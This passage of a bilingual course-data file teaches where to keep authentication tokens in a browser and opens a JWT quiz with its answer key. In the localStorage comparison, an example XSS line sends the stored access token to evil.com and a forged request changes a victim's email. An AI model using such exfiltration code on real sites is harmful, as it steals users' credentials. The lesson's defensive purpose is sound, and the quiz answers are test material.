<a class="link-card codelab" href="/code-lab/tracks/authentication${REF}"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">Code Lab — track "Authentication"</span><span class="lc-sub">Xoay một khoá ký theo ba pha khi vẫn có lưu lượng, rồi làm lại theo thứ tự SAI</span></span></a>
</div>
`,
    },
    /* ─────────────────────────── 4.5 ─────────────────────────── */
    {
      title: '4.5 — Where to keep a token in the browser|||4.5 — Cất token ở đâu trong trình duyệt',
      slug: 'auth-4-5-cat-token-o-dau',
      type: 'LESSON',
      description: 'localStorage đối lại cookie là cuộc tranh luận ồn ào nhất trong mảng này, và nó có một câu trả lời. Bài này so sánh CHÍNH XÁC một lỗ XSS lấy được gì trong từng lựa chọn, giải thích mẫu token-trong-bộ-nhớ cộng refresh-trong-cookie cho SPA, và mẫu BFF mà OAuth hiện khuyến nghị cho trình duyệt.',
      content: `
<div class="ml-en">
<span class="eyebrow">Chapter 4 · Lesson 4.5</span>
<h2>Where to keep a token in the browser</h2>
<p class="lead">This argument is usually conducted as "XSS beats cookies anyway, so <code>localStorage</code> is fine" versus "cookies are safer, use cookies". Both slogans skip the part that matters, which is what an attacker gets in each case. Compare that precisely and the answer stops being a matter of taste.</p>

<h3>What one XSS actually yields</h3>
<div class="lz-map">
  <div class="lz-stage">
    <span class="lz-badge">localStorage</span>
    <div class="lz-node"><div class="lz-nbody"><span class="lz-ntitle">The token itself, exfiltrated</span><span class="lz-nsub">Usable from the attacker's machine, at leisure, until it expires</span></div></div>
  </div>
  <div class="lz-stage">
    <span class="lz-badge">HttpOnly cookie</span>
    <div class="lz-node"><div class="lz-nbody"><span class="lz-ntitle">Actions, while the script runs</span><span class="lz-nsub">Only from the victim's browser, only on your origin</span></div></div>
  </div>
</div>
<pre><code><span class="tok-comment">// XSS meets localStorage: one line, and the attacker HOLDS the token</span>
fetch('https://evil.com/?t=' + localStorage.getItem('accessToken'));

<span class="tok-comment">// XSS meets an HttpOnly cookie: they can ACT, but they HOLD nothing</span>
fetch('/api/change-email', {
  method: 'POST', credentials: 'include',
  headers: { 'content-type': 'application/json' },
  body: JSON.stringify({ email: 'ke-tan-cong@evil.com' }),
});</code></pre>
<div class="kv-grid">
  <div class="kv"><span class="k">Exfiltration versus proxying</span><span class="v">A stolen token works from anywhere, for as long as it is valid, with no script running. A cookie the attacker cannot read forces every action through the victim's browser while the page is open — which is worse for the attacker in every dimension.</span></div>
  <div class="kv"><span class="k">It survives the tab closing</span><span class="v">A token in <code>localStorage</code> and then in the attacker's database outlives the page, the browser and the user noticing. The <code>HttpOnly</code> attack ends when the tab does.</span></div>
  <div class="kv"><span class="k">It bypasses everything origin-bound</span><span class="v">Your CSP, your rate limits keyed on session behaviour, your anomaly detection on a familiar device — all of it assumed the request comes from the victim's browser. A stolen bearer token does not.</span></div>
  <div class="kv"><span class="k">The honest counterpoint</span><span class="v">Both outcomes are bad, and XSS remains the thing to prevent. But "equally bad" is false: one is a session-length incident and the other is a credential in an attacker's hands. Design for the difference.</span></div>
</div>
<div class="callout ok">
<p><strong>The default answer is an <code>HttpOnly</code>, <code>Secure</code>, <code>SameSite=Lax</code>, <code>__Host-</code> cookie.</strong> The objection to cookies is CSRF, and Chapter 3.4 showed CSRF costs one attribute plus one middleware. The objection to <code>localStorage</code> is XSS, and XSS is a permanent, expensive engineering problem across every dependency you ship. Trading a solved problem for an unsolved one is the wrong trade, and it is the whole argument in one sentence.</p>
</div>

<h3>The five options, ranked</h3>
<div class="lz-stack">
  <div class="lz-layer"><span class="lz-lname">1 · <code>HttpOnly</code> cookie — the default</span><span class="lz-lnote">Script cannot read it. CSRF is handled by <code>SameSite=Lax</code> plus a <code>Sec-Fetch-Site</code> check. Works with server rendering, with a same-origin SPA, and with a BFF. Choose this unless your architecture genuinely prevents it.</span></div>
  <div class="lz-layer"><span class="lz-lname">2 · In memory, with a refresh cookie — for cross-origin SPAs</span><span class="lz-lnote">The access token lives in a JavaScript variable, never persisted; a refresh token in an <code>HttpOnly</code> cookie restores it on page load. XSS can still use the in-memory token while the page is open, but cannot steal the long-lived one. This is the right answer when the API is on a different site.</span></div>
  <div class="lz-layer"><span class="lz-lname">3 · A service worker holding the token</span><span class="lz-lnote">The worker attaches the header and the token never enters page scope, so page-level XSS cannot read it. Real hardening, real complexity — registration timing, scope, updates, and a fallback for the first load. Worth it for high-value applications, overkill for most.</span></div>
  <div class="lz-layer"><span class="lz-lname">4 · <code>sessionStorage</code> — marginally better than localStorage</span><span class="lz-lnote">Per-tab and cleared when the tab closes, which shortens the window. It is still readable by any script on the page, so the exfiltration attack is unchanged. The improvement is real and small.</span></div>
  <div class="lz-layer"><span class="lz-lname">5 · <code>localStorage</code>, or a non-<code>HttpOnly</code> cookie</span><span class="lz-lnote">The non-<code>HttpOnly</code> cookie is the worst of both: readable by script <em>and</em> attached automatically, so you get the XSS exposure and the CSRF exposure together. If you see one in a codebase, it is almost always an accident.</span></div>
</div>

<h3>The in-memory pattern, concretely</h3>
<pre><code><span class="tok-comment">// Access token: in memory only. No localStorage, no cookie.</span>
let accessToken: string | null = null;

async function call(url: string, opt: RequestInit = {}) {
  const r = await fetch(url, {
    ...opt,
    headers: { ...opt.headers, Authorization: &#96;Bearer \${accessToken}&#96; },
  });
  if (r.status !== 401) return r;

  <span class="tok-comment">// Expired → exchange it for a new one using the HttpOnly refresh cookie</span>
  const moi = await fetch('https://api.vidu.com/auth/refresh', {
    method: 'POST', credentials: 'include',        <span class="tok-comment">// the cookie rides along</span>
  });
  if (!moi.ok) { redirectToSignIn(); return r; }

  accessToken = (await moi.json()).accessToken;    <span class="tok-comment">// lives only in a variable</span>
  return goi(url, opt);                            <span class="tok-comment">// retry EXACTLY once</span>
}</code></pre>
<div class="out"># Tai lai trang → accessToken = null → mot lan /auth/refresh → co lai.
# Nguoi dung khong thay gi. Refresh token khong bao gio cham toi JavaScript.

# XSS van dung duoc accessToken trong luc trang mo — nhung khong lay
# duoc cai token DAI HAN, nen no khong sang duoc may cua ke tan cong.</div>
<div class="pitfall">
<p><strong>Trap — the retry must be exactly once, and it must be shared across concurrent requests.</strong> A naive interceptor that refreshes on every 401 produces an infinite loop when the refresh itself returns 401, and fires ten simultaneous refreshes when ten requests expire together — which, with the rotation in Chapter 5, makes nine of them look like token reuse and revokes the whole family. Keep a single in-flight refresh promise that every caller awaits, and never retry a refresh that failed.</p>
</div>

<h3>The BFF: the current recommendation for browsers</h3>
<div class="lz-map">
  <div class="lz-stage">
    <span class="lz-badge">Browser</span>
    <div class="lz-node"><div class="lz-nbody"><span class="lz-ntitle">A session cookie only</span><span class="lz-nsub">No token, no refresh token, nothing script can read</span></div></div>
  </div>
  <div class="lz-stage">
    <span class="lz-badge">BFF — your own server</span>
    <div class="lz-node"><div class="lz-nbody"><span class="lz-ntitle">Holds the tokens</span><span class="lz-nsub">Exchanges the cookie for them, calls the API on the user's behalf</span></div></div>
  </div>
  <div class="lz-stage">
    <span class="lz-badge">API</span>
    <div class="lz-node"><div class="lz-nbody"><span class="lz-ntitle">Sees a normal bearer token</span><span class="lz-nsub">And never has to trust a browser with one</span></div></div>
  </div>
</div>
<div class="kv-grid">
  <div class="kv"><span class="k">Why it is recommended</span><span class="v">The OAuth working group's browser-based-apps guidance now names it the preferred architecture. No token of any kind reaches JavaScript, so the entire class of storage decisions above disappears, along with token exfiltration by XSS.</span></div>
  <div class="kv"><span class="k">What it costs</span><span class="v">A server component that must exist, be deployed and be scaled — plus a hop on every API call. If you already render from a Node server, Next.js route handler or similar, you are most of the way there and the cost is small.</span></div>
  <div class="kv"><span class="k">CSRF comes back</span><span class="v">The browser now uses a cookie again, so Chapter 3.4 applies in full. That is the trade, and it is a good one: CSRF has a one-line browser-level defence and token exfiltration does not.</span></div>
  <div class="kv"><span class="k">Mobile is a different question</span><span class="v">Native apps have no XSS and do have a secure store: iOS Keychain, Android Keystore. Store the refresh token there, keep the access token in memory, and never use shared preferences or a plain file.</span></div>
</div>
<div class="note-ct">
<p><strong>What this codebase does, and why it is defensible.</strong> CuongThai puts its JWT in a <code>backend_token</code> cookie rather than in <code>localStorage</code> — script cannot read it, and CSRF is handled at the cookie and origin level. The refresh path exists because the token is short-lived and the cookie is not (Lesson 4.1). It is not a BFF and does not need to be: the front end and the API are the same site, so there is no cross-origin problem to solve and adding a hop would buy nothing. Pick the simplest architecture that keeps the token out of JavaScript — that is the actual rule, and everything above is how to satisfy it in different situations.</p>
</div>

<h3>Learning sources for this lesson</h3>
<a class="link-card" href="https://datatracker.ietf.org/doc/html/draft-ietf-oauth-browser-based-apps" target="_blank" rel="noopener"><span class="lc-ico">🌐</span><span class="lc-body"><span class="lc-title">OAuth for browser-based apps</span><span class="lc-sub">datatracker.ietf.org · The BFF recommendation, with the reasoning and the alternatives</span></span></a>
<a class="link-card" href="https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#local-storage" target="_blank" rel="noopener"><span class="lc-ico">💾</span><span class="lc-body"><span class="lc-title">OWASP — local storage</span><span class="lc-sub">cheatsheetseries.owasp.org · Why it is not a place for anything sensitive</span></span></a>
<a class="link-card" href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener"><span class="lc-ico">🚫</span><span class="lc-body"><span class="lc-title">OWASP — XSS prevention</span><span class="lc-sub">cheatsheetseries.owasp.org · The problem this whole lesson is downstream of</span></span></a>
<a class="link-card" href="/courses/nodejs/learn${REF}"><span class="lc-ico">🟢</span><span class="lc-body"><span class="lc-title">CuongThai course — Node.js</span><span class="lc-sub">CSP, sanitisation and a stored-XSS reproduced end to end in a real browser</span></span></a>
<a class="link-card codelab" href="/code-lab/tracks/authentication${REF}"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">Code Lab — track "Authentication"</span><span class="lc-sub">Run one XSS payload against all five storage choices and compare what it gets</span></span></a>
</div>

<div class="ml-vi">
<span class="eyebrow">Chương 4 · Bài 4.5</span>
<h2>Cất token ở đâu trong trình duyệt</h2>
<p class="lead">Cuộc tranh luận này thường được tiến hành theo kiểu "dính XSS thì cookie cũng thua thôi, nên <code>localStorage</code> cũng được" đối lại "cookie an toàn hơn, cứ dùng cookie". Cả hai khẩu hiệu đều bỏ qua đúng cái phần quan trọng: kẻ tấn công LẤY ĐƯỢC GÌ trong từng trường hợp. So sánh chính xác điều đó thì câu trả lời thôi là chuyện khẩu vị.</p>

<h3>Một lỗ XSS THẬT SỰ mang lại cái gì</h3>
<div class="lz-map">
  <div class="lz-stage">
    <span class="lz-badge">localStorage</span>
    <div class="lz-node"><div class="lz-nbody"><span class="lz-ntitle">CHÍNH cái token, tuồn ra ngoài</span><span class="lz-nsub">Dùng được từ máy kẻ tấn công, thong thả, cho tới khi hết hạn</span></div></div>
  </div>
  <div class="lz-stage">
    <span class="lz-badge">Cookie HttpOnly</span>
    <div class="lz-node"><div class="lz-nbody"><span class="lz-ntitle">Hành ĐỘNG, trong lúc script còn chạy</span><span class="lz-nsub">Chỉ từ trình duyệt của nạn nhân, chỉ trên origin của bạn</span></div></div>
  </div>
</div>
<pre><code><span class="tok-comment">// XSS gặp localStorage: một dòng, và kẻ tấn công CẦM cái token</span>
fetch('https://evil.com/?t=' + localStorage.getItem('accessToken'));

<span class="tok-comment">// XSS gặp cookie HttpOnly: họ HÀNH ĐỘNG được, nhưng không CẦM được gì</span>
fetch('/api/change-email', {
  method: 'POST', credentials: 'include',
  headers: { 'content-type': 'application/json' },
  body: JSON.stringify({ email: 'ke-tan-cong@evil.com' }),
});</code></pre>
<div class="kv-grid">
  <div class="kv"><span class="k">TUỒN RA đối lại LÀM HỘ</span><span class="v">Một token bị cắp chạy được từ BẤT CỨ ĐÂU, trong suốt thời gian nó còn hiệu lực, mà không cần script nào đang chạy. Một cookie kẻ tấn công không đọc được thì buộc MỌI hành động phải đi qua trình duyệt của nạn nhân trong lúc trang còn mở — điều đó tệ hơn cho kẻ tấn công ở MỌI chiều.</span></div>
  <div class="kv"><span class="k">Nó SỐNG SÓT qua việc đóng tab</span><span class="v">Một token trong <code>localStorage</code> rồi trong cơ sở dữ liệu của kẻ tấn công thì sống lâu hơn cái trang, cái trình duyệt, và cả việc người dùng nhận ra. Cú tấn công với <code>HttpOnly</code> thì KẾT THÚC khi tab đóng.</span></div>
  <div class="kv"><span class="k">Nó vượt qua MỌI thứ ràng theo origin</span><span class="v">CSP của bạn, giới hạn tốc độ dựa trên hành vi phiên, phát hiện bất thường dựa trên một thiết bị quen — tất cả đều GIẢ ĐỊNH request tới từ trình duyệt của nạn nhân. Một bearer token bị cắp thì không.</span></div>
  <div class="kv"><span class="k">Phản biện trung thực</span><span class="v">Cả hai kết cục đều TỆ, và XSS vẫn là thứ phải ngăn. Nhưng "tệ như nhau" là SAI: một cái là sự cố dài bằng một phiên, cái kia là một tín vật nằm trong tay kẻ tấn công. Hãy thiết kế theo cái khác biệt đó.</span></div>
</div>
<div class="callout ok">
<p><strong>Câu trả lời MẶC ĐỊNH là một cookie <code>HttpOnly</code>, <code>Secure</code>, <code>SameSite=Lax</code>, <code>__Host-</code>.</strong> Lời phản đối cookie là CSRF, và Chương 3.4 đã chỉ ra CSRF tốn một thuộc tính cộng một middleware. Lời phản đối <code>localStorage</code> là XSS, và XSS là một bài toán kỹ thuật VĨNH VIỄN, đắt đỏ, trải khắp mọi gói phụ thuộc bạn ship. Đổi một bài toán ĐÃ GIẢI lấy một bài toán CHƯA GIẢI là một cú đổi sai, và đó là toàn bộ cuộc tranh luận gói trong một câu.</p>
</div>

<h3>Năm lựa chọn, xếp hạng</h3>
<div class="lz-stack">
  <div class="lz-layer"><span class="lz-lname">1 · Cookie <code>HttpOnly</code> — mặc định</span><span class="lz-lnote">Script không đọc được. CSRF do <code>SameSite=Lax</code> cộng một phép kiểm <code>Sec-Fetch-Site</code> lo. Chạy được với dựng trang phía máy chủ, với một SPA cùng origin, và với một BFF. Hãy chọn cái này trừ khi kiến trúc của bạn THẬT SỰ ngăn cản.</span></div>
  <div class="lz-layer"><span class="lz-lname">2 · Trong BỘ NHỚ, kèm cookie refresh — cho SPA khác origin</span><span class="lz-lnote">Access token sống trong một biến JavaScript, không lưu đâu cả; một refresh token trong cookie <code>HttpOnly</code> khôi phục nó lúc tải trang. XSS vẫn DÙNG được cái token trong bộ nhớ khi trang còn mở, nhưng KHÔNG cắp được cái dài hạn. Đây là câu trả lời đúng khi API nằm ở một site khác.</span></div>
  <div class="lz-layer"><span class="lz-lname">3 · Một service worker giữ token</span><span class="lz-lnote">Worker tự đính header và token KHÔNG BAO GIỜ đi vào phạm vi trang, nên XSS ở mức trang không đọc nổi. Đây là gia cố THẬT, và phức tạp THẬT — thời điểm đăng ký, phạm vi, cập nhật, và một đường lùi cho lần tải đầu. Đáng với ứng dụng giá trị cao, thừa thãi với phần lớn.</span></div>
  <div class="lz-layer"><span class="lz-lname">4 · <code>sessionStorage</code> — nhỉnh hơn localStorage một chút</span><span class="lz-lnote">Theo từng tab và bị xoá khi đóng tab, nên cửa sổ tấn công ngắn lại. Nó VẪN đọc được bởi mọi script trên trang, nên cú tuồn dữ liệu ra thì không đổi. Cải thiện là có thật và NHỎ.</span></div>
  <div class="lz-layer"><span class="lz-lname">5 · <code>localStorage</code>, hoặc một cookie KHÔNG <code>HttpOnly</code></span><span class="lz-lnote">Cái cookie không <code>HttpOnly</code> là TỆ NHẤT của cả hai thế giới: script đọc được <em>VÀ</em> được đính tự động, nên bạn lãnh cả phơi nhiễm XSS lẫn phơi nhiễm CSRF cùng lúc. Thấy một cái như thế trong kho mã thì gần như luôn là do vô tình.</span></div>
</div>

<h3>Mẫu trong-bộ-nhớ, viết ra cụ thể</h3>
<pre><code><span class="tok-comment">// Access token: chỉ trong bộ nhớ. Không localStorage, không cookie.</span>
let accessToken: string | null = null;

async function call(url: string, opt: RequestInit = {}) {
  const r = await fetch(url, {
    ...opt,
    headers: { ...opt.headers, Authorization: &#96;Bearer \${accessToken}&#96; },
  });
  if (r.status !== 401) return r;

  <span class="tok-comment">// Hết hạn → đổi lấy cái mới bằng cookie refresh HttpOnly</span>
  const moi = await fetch('https://api.vidu.com/auth/refresh', {
    method: 'POST', credentials: 'include',        <span class="tok-comment">// cookie đi kèm</span>
  });
  if (!moi.ok) { redirectToSignIn(); return r; }

  accessToken = (await moi.json()).accessToken;    <span class="tok-comment">// chỉ nằm trong biến</span>
  return goi(url, opt);                            <span class="tok-comment">// thử lại ĐÚNG MỘT lần</span>
}</code></pre>
<div class="out"># Tai lai trang → accessToken = null → mot lan /auth/refresh → co lai.
# Nguoi dung khong thay gi. Refresh token khong bao gio cham toi JavaScript.

# XSS van dung duoc accessToken trong luc trang mo — nhung khong lay
# duoc cai token DAI HAN, nen no khong sang duoc may cua ke tan cong.</div>
<div class="pitfall">
<p><strong>Bẫy — lần thử lại phải là ĐÚNG MỘT lần, và phải DÙNG CHUNG giữa các request song song.</strong> Một interceptor ngây thơ cứ gặp 401 là refresh sẽ tạo ra một vòng lặp vô tận khi chính lời gọi refresh trả về 401, và bắn ra mười lời gọi refresh cùng lúc khi mười request cùng hết hạn — mà với cơ chế xoay vòng ở Chương 5, chín cái trong số đó trông y hệt việc TÁI DÙNG token và sẽ thu hồi cả họ token. Hãy giữ MỘT lời hứa refresh đang bay mà mọi bên gọi cùng chờ, và ĐỪNG BAO GIỜ thử lại một lần refresh đã trượt.</p>
</div>

<h3>BFF: khuyến nghị hiện hành cho trình duyệt</h3>
<div class="lz-map">
  <div class="lz-stage">
    <span class="lz-badge">Trình duyệt</span>
    <div class="lz-node"><div class="lz-nbody"><span class="lz-ntitle">CHỈ một cookie phiên</span><span class="lz-nsub">Không token, không refresh token, không gì script đọc được</span></div></div>
  </div>
  <div class="lz-stage">
    <span class="lz-badge">BFF — máy chủ của chính bạn</span>
    <div class="lz-node"><div class="lz-nbody"><span class="lz-ntitle">Nó GIỮ các token</span><span class="lz-nsub">Đổi cookie lấy token, rồi gọi API thay mặt người dùng</span></div></div>
  </div>
  <div class="lz-stage">
    <span class="lz-badge">API</span>
    <div class="lz-node"><div class="lz-nbody"><span class="lz-ntitle">Nhìn thấy một bearer token bình thường</span><span class="lz-nsub">Và không bao giờ phải tin một trình duyệt với token nào</span></div></div>
  </div>
</div>
<div class="kv-grid">
  <div class="kv"><span class="k">Vì sao nó được khuyến nghị</span><span class="v">Hướng dẫn về ứng dụng chạy trong trình duyệt của nhóm làm việc OAuth nay gọi tên nó là kiến trúc ƯU TIÊN. Không token loại nào tới được JavaScript, nên toàn bộ lớp quyết định về chỗ cất ở trên biến mất, cùng với việc XSS tuồn được token ra ngoài.</span></div>
  <div class="kv"><span class="k">Nó tốn gì</span><span class="v">Một thành phần máy chủ phải tồn tại, phải triển khai và phải mở rộng được — cộng một bước nhảy ở mỗi lời gọi API. Nếu bạn vốn đã dựng trang từ một máy chủ Node, một route handler của Next.js hay tương tự, thì bạn đã đi gần hết đường và chi phí là nhỏ.</span></div>
  <div class="kv"><span class="k">CSRF QUAY LẠI</span><span class="v">Trình duyệt nay lại dùng cookie, nên Chương 3.4 áp dụng đầy đủ. Đó là cuộc đánh đổi, và nó là một cuộc đánh đổi TỐT: CSRF có một lớp phòng một dòng ở mức trình duyệt, còn việc tuồn token ra thì không.</span></div>
  <div class="kv"><span class="k">Di động là một câu hỏi KHÁC</span><span class="v">App gốc thì không có XSS và CÓ một kho an toàn: Keychain của iOS, Keystore của Android. Hãy cất refresh token ở đó, giữ access token trong bộ nhớ, và ĐỪNG BAO GIỜ dùng shared preferences hay một file trần.</span></div>
</div>
<div class="note-ct">
<p><strong>Kho mã này làm gì, và vì sao nó bảo vệ được.</strong> CuongThai đặt JWT của mình vào cookie <code>backend_token</code> chứ không phải vào <code>localStorage</code> — script không đọc được, và CSRF được lo ở mức cookie và mức origin. Đường refresh tồn tại vì token thì ngắn hạn còn cookie thì không (Bài 4.1). Nó KHÔNG phải một BFF và cũng không cần: front end và API cùng một site, nên chẳng có bài toán xuyên origin nào để giải và thêm một bước nhảy sẽ chẳng mua được gì. Hãy chọn kiến trúc ĐƠN GIẢN NHẤT giữ được token nằm NGOÀI JavaScript — đó mới là cái luật thật, còn mọi thứ ở trên là cách thoả mãn nó trong những hoàn cảnh khác nhau.</p>
</div>

<h3>Nguồn học cho bài này</h3>
<a class="link-card" href="https://datatracker.ietf.org/doc/html/draft-ietf-oauth-browser-based-apps" target="_blank" rel="noopener"><span class="lc-ico">🌐</span><span class="lc-body"><span class="lc-title">OAuth cho ứng dụng chạy trong trình duyệt</span><span class="lc-sub">datatracker.ietf.org · Khuyến nghị BFF, kèm lập luận và các phương án thay thế</span></span></a>
<a class="link-card" href="https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#local-storage" target="_blank" rel="noopener"><span class="lc-ico">💾</span><span class="lc-body"><span class="lc-title">OWASP — local storage</span><span class="lc-sub">cheatsheetseries.owasp.org · Vì sao nó không phải chỗ cho bất cứ thứ gì nhạy cảm</span></span></a>
<a class="link-card" href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener"><span class="lc-ico">🚫</span><span class="lc-body"><span class="lc-title">OWASP — phòng chống XSS</span><span class="lc-sub">cheatsheetseries.owasp.org · Bài toán mà cả bài học này là hệ quả của nó</span></span></a>
<a class="link-card" href="/courses/nodejs/learn${REF}"><span class="lc-ico">🟢</span><span class="lc-body"><span class="lc-title">Khoá CuongThai — Node.js</span><span class="lc-sub">CSP, làm sạch dữ liệu và một cú XSS lưu trữ tái hiện end-to-end trên trình duyệt thật</span></span></a>
<a class="link-card codelab" href="/code-lab/tracks/authentication${REF}"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">Code Lab — track "Authentication"</span><span class="lc-sub">Chạy MỘT payload XSS lên cả năm lựa chọn cất token và so xem nó lấy được gì</span></span></a>
</div>
`,
    },
    /* ─────────────────────────── 4.6 ─────────────────────────── */
    {
      title: '4.6 — Quiz: JWT|||4.6 — Quiz: JWT',
      slug: 'auth-4-6-quiz',
      type: 'QUIZ',
      description: 'Tám câu về ba phần của một token, trường alg, các claim bắt buộc kiểm, kid và JWKS, và chỗ cất token trong trình duyệt.',
      content: `
<div class="ml-en">
<span class="eyebrow">Chapter 4 · Lesson 4.6</span>
<h2>Quiz: JWT</h2>
<p class="lead">Eight questions. Three of them describe code that compiles, runs, passes its tests, and is a complete authentication bypass — which is the recurring shape of everything in this chapter.</p>
<div class="callout">
<p><strong>What this chapter established.</strong> A JWT is readable by anyone holding it, and the signature covers exact bytes (4.1). The <code>alg</code> field is attacker input, so pin the algorithm to a single value and ignore <code>jku</code> and <code>jwk</code> (4.2). A valid signature is not a valid token — check <code>iss</code>, <code>aud</code> and <code>exp</code>, and never compute <code>exp</code> from <code>Date.now()</code> (4.3). Name keys with <code>kid</code> and rotate by publishing before signing (4.4). Keep the token out of JavaScript: an <code>HttpOnly</code> cookie by default, in-memory plus a refresh cookie when cross-origin (4.5).</p>
</div>
</div>

<div class="ml-vi">
<span class="eyebrow">Chương 4 · Bài 4.6</span>
<h2>Quiz: JWT</h2>
<p class="lead">Tám câu. Ba câu mô tả đoạn mã BIÊN DỊCH ĐƯỢC, CHẠY ĐƯỢC, TEST XANH, và là một cú vượt xác thực HOÀN TOÀN — đó là hình dạng lặp đi lặp lại của mọi thứ trong chương này.</p>
<div class="callout">
<p><strong>Chương này đã xác lập điều gì.</strong> Một JWT thì AI CẦM CŨNG ĐỌC ĐƯỢC, và chữ ký phủ lên đúng những BYTE (4.1). Trường <code>alg</code> là đầu vào của kẻ tấn công, nên hãy GHIM thuật toán về một giá trị duy nhất và LỜ <code>jku</code> với <code>jwk</code> (4.2). Chữ ký hợp lệ KHÔNG có nghĩa token hợp lệ — hãy kiểm <code>iss</code>, <code>aud</code> và <code>exp</code>, và đừng bao giờ tính <code>exp</code> từ <code>Date.now()</code> (4.3). Đặt tên khoá bằng <code>kid</code> và xoay vòng theo thứ tự công-bố-trước-khi-ký (4.4). Hãy giữ token NGOÀI JavaScript: mặc định là cookie <code>HttpOnly</code>, còn khi khác origin thì để trong bộ nhớ cộng một cookie refresh (4.5).</p>
</div>
</div>
`,
      quiz: {
        timeLimitSeconds: 720,
        questions: [
          {
            question: 'Who can read the claims inside a signed JWT?|||Ai đọc được các claim bên trong một JWT đã ký?',
            options: [
              'Only the server holding the key|||Chỉ máy chủ đang giữ khoá',
              'Anyone holding the token — base64url is an encoding, not encryption, so never put private data in one|||Bất kỳ ai CẦM cái token — base64url là mã hoá ký tự chứ không phải mật mã hoá, nên đừng bao giờ đặt dữ liệu riêng tư vào đó',
              'Only the issuer and the audience|||Chỉ bên phát hành và bên nhận',
              'Nobody; the payload is encrypted|||Không ai cả; payload được mã hoá',
            ],
            correctIndex: 1,
            points: 1,
          },
          {
            question: 'Your code calls jwt.verify(token, publicKeyPem) with no options. What is the attack?|||Mã của bạn gọi jwt.verify(token, publicKeyPem) mà không kèm tuỳ chọn nào. Cú tấn công là gì?',
            options: [
              'None; the public key cannot forge signatures|||Không có; khoá công thì không giả mạo được chữ ký',
              'Algorithm confusion: the attacker sets alg to HS256 and HMACs with the public PEM as the secret, so both sides compute the same value and the token verifies|||Nhầm lẫn thuật toán: kẻ tấn công đặt alg thành HS256 rồi HMAC bằng chính chuỗi PEM công khai làm bí mật, nên hai bên tính ra cùng một giá trị và token xác minh trót lọt',
              'The token is too large|||Cái token quá lớn',
              'The key must be rotated first|||Phải xoay khoá trước đã',
            ],
            correctIndex: 1,
            points: 1,
          },
          {
            question: 'What is the fix that closes alg=none, algorithm confusion and jku injection at once?|||Cách vá nào bịt được alg=none, nhầm lẫn thuật toán và tiêm jku CÙNG MỘT LÚC?',
            options: [
              'Reject any token whose alg is "none"|||Từ chối mọi token có alg là "none"',
              'Pass an explicit allowlist with exactly one algorithm, and never let the token choose the algorithm or the key source|||Truyền một danh sách trắng tường minh với ĐÚNG MỘT thuật toán, và đừng bao giờ để token chọn thuật toán hay nguồn khoá',
              'Use RS256 instead of HS256|||Dùng RS256 thay cho HS256',
              'Validate the payload with a JSON schema|||Kiểm payload bằng một lược đồ JSON',
            ],
            correctIndex: 1,
            points: 1,
          },
          {
            question: 'A token is signed with exp: Date.now() + 900000. When does it expire?|||Một token được ký với exp: Date.now() + 900000. Nó hết hạn khi nào?',
            options: [
              'In fifteen minutes|||Sau mười lăm phút',
              'In the year 57219 — exp is in seconds and Date.now() is milliseconds, so the token effectively never expires and nothing warns you|||Vào năm 57219 — exp tính bằng GIÂY còn Date.now() là MILI GIÂY, nên thực tế token không bao giờ hết hạn và chẳng có gì cảnh báo bạn',
              'Immediately|||Ngay lập tức',
              'After one day|||Sau một ngày',
            ],
            correctIndex: 1,
            points: 1,
          },
          {
            question: 'Two services trust the same issuer and the same key. What stops a token for one being replayed against the other?|||Hai dịch vụ cùng tin một bên phát hành và một cái khoá. Cái gì chặn một token của bên này bị phát lại vào bên kia?',
            options: [
              'The signature|||Cái chữ ký',
              'Checking aud: each service accepts only its own audience value, so a token minted for the public API is rejected by the admin API|||Kiểm aud: mỗi dịch vụ chỉ chấp nhận giá trị audience của riêng nó, nên một token đúc cho API công khai bị API quản trị từ chối',
              'Checking exp|||Kiểm exp',
              'Nothing; that is expected behaviour|||Không có gì; đó là hành vi mong đợi',
            ],
            correctIndex: 1,
            points: 1,
          },
          {
            question: 'In what order do you rotate a signing key without breaking live tokens?|||Xoay một khoá ký theo thứ tự nào để không làm vỡ token đang sống?',
            options: [
              'Switch the signing key, then publish the new public key|||Chuyển khoá ký, rồi mới công bố khoá công mới',
              'Publish the new public key first, wait one JWKS cache TTL, then switch signing, then retire the old key after the maximum token lifetime|||CÔNG BỐ khoá công mới TRƯỚC, chờ hết một chu kỳ cache JWKS, rồi mới chuyển sang ký bằng nó, rồi rút khoá cũ sau khi hết tuổi thọ tối đa của token',
              'Replace both at the same instant|||Thay cả hai cùng một khoảnh khắc',
              'Rotation always requires a maintenance window|||Xoay vòng thì luôn phải có một cửa sổ bảo trì',
            ],
            correctIndex: 1,
            points: 1,
          },
          {
            question: 'What is the difference between an XSS against localStorage and one against an HttpOnly cookie?|||Khác biệt giữa một cú XSS nhắm vào localStorage với một cú nhắm vào cookie HttpOnly là gì?',
            options: [
              'None; XSS defeats both equally|||Không khác; XSS hạ cả hai như nhau',
              'localStorage lets the attacker exfiltrate the token and use it from their own machine until it expires; with HttpOnly they can only act through the victim browser while the script runs|||localStorage cho kẻ tấn công TUỒN cái token ra và dùng nó từ máy của họ cho tới khi hết hạn; với HttpOnly họ chỉ hành động được qua trình duyệt nạn nhân trong lúc script còn chạy',
              'HttpOnly prevents XSS|||HttpOnly ngăn được XSS',
              'localStorage is protected by the same-origin policy, so it is safer|||localStorage được chính sách cùng-origin bảo vệ nên an toàn hơn',
            ],
            correctIndex: 1,
            points: 1,
          },
          {
            question: 'A cross-origin SPA must hold an access token. What is the recommended arrangement?|||Một SPA khác origin buộc phải giữ một access token. Cách bố trí được khuyến nghị là gì?',
            options: [
              'localStorage, with a short expiry|||localStorage, kèm thời hạn ngắn',
              'Access token in a JavaScript variable only, refresh token in an HttpOnly cookie, with a single shared in-flight refresh and no retry after a failed refresh — or a BFF so no token reaches the browser at all|||Access token CHỈ nằm trong một biến JavaScript, refresh token trong cookie HttpOnly, với MỘT lời gọi refresh dùng chung đang bay và KHÔNG thử lại sau một lần refresh trượt — hoặc một BFF để không token nào tới được trình duyệt',
              'A non-HttpOnly cookie so the SPA can read it|||Một cookie không HttpOnly để SPA đọc được',
